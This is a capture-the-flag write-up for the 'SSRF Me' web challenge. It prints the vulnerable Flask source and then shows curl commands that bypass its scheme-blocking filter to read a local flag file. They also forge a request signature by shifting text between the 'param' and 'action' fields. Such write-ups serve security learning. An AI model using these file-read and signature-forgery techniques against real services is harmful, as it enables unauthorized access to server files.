# SSRF Me

Category: `web`

Description: `SSRF ME TO GET FLAG.`

Hint: `flag is in ./flag.txt`

Service: `http://139.180.128.86/`

Points: `78`

### What It Does

This is on SSRF. We have to bypass the WAF checks and try to read a local file that contains the flag.

The contents of the main page shows the source code of the web application.

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)
```

`geneSign` API generates a MD5 hash `sign` of the user-supplied `param` for the `action` of `scan`.

`De1ta` API has a WAF check and ensures that the supplied `sign` is correct. The WAF checks that `param` does not starts with `gopher` or `file` to prevent common URL schemes. The API only has 2 valid `action`: `scan` and `read`. With a valid request, the web application executes the actions if `action` contains the substring `scan` or `read`. `scan` writes the output of a URL to a file and `read` returns the file contents.

### How to Solve

We have to use `scan` to write the file contents of `flag.txt` to the file so that we can use `read` on it to retrieve the contents.

`scan` uses `urllib.urlopen()` function.

```python
def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"
```

To bypass the WAF checks, we cannot use `gopher` or `file` URL scheme to get the file contents.

From the Python 2 `urllib` [docs](https://docs.python.org/2/library/urllib.html#urllib.urlopen):

> If the URL does not have a scheme identifier, or if it has `file:` as its scheme identifier, this opens a local file

Hence, we can just use `urllib.urlopen("flag.txt")` to open a local file without supplying a URL scheme.

```shellsession
ubuntu@ubuntu-bionic:~$ curl http://139.180.128.86/geneSign?param=flag.txt
8370bdba94bd5aaf7427b84b3f52d7cbubuntu@ubuntu-bionic:~$ 
```

_Note: `urllib2.urlopen()`, equivalent to `urllib.request.urlopen()` in Python 3, requires a URL scheme_

We also have to make a valid request that will also execute the `read` action.

The function that generates `sign` is as follows:

```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

Notice that `param` is concatenated with `action`.

We can use the `geneSign` API to generate the `sign` of the `param` `flag.txtread` for the `scan` action. Then, trick the `De1ta` API with `param` `flag.txt` and `readscan` action using the generated `sign`. Since `action` contains both `scan` and `read`, both actions are executed.

```shellsession
ubuntu@ubuntu-bionic:~$ curl http://139.180.128.86/geneSign?param=flag.txtread
7cde191de87fe3ddac26e19acae1525eubuntu@ubuntu-bionic:~$ 
ubuntu@ubuntu-bionic:~$ curl http://139.180.128.86/De1ta?param=flag.txt --cookie 'action=readscan;sign=7cde191de87fe3ddac26e19acae1525e'
{"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}"}ubuntu@ubuntu-bionic:~$ 
```

Alternatively, we can combine the requests in a single line:

```shellsession
ubuntu@ubuntu-bionic:~$ curl http://139.180.128.86/De1ta?param=flag.txt --cookie "action=readscan;sign=$(curl http://139.180.128.86/geneSign?param=flag.txtread)"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    32  100    32    0     0     16      0  0:00:02  0:00:01  0:00:01    16
{"code": 200, "data": "de1ctf{27782fcffbb7d00309a93bc49b74ca26}"}ubuntu@ubuntu-bionic:~$ 
```

**Flag: `de1ctf{27782fcffbb7d00309a93bc49b74ca26}`**